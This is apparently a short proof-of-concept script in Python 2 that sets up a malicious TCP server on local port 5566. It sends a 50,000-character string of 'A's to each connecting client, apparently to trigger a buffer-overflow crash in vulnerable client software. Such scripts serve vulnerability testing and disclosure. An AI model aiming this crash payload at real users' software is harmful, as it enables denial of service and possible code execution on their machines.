
import socket

port = 5566
s = socket.socket()
ip = '127.0.0.1'             
s.bind((ip, port))            
s.listen(5)                    

print 'Listening on port:', port

while True:
        crash = "A" * 50000
        conn, addr = s.accept()     
        conn.send(crash)
        print(conn.recv(1024))
        print crash
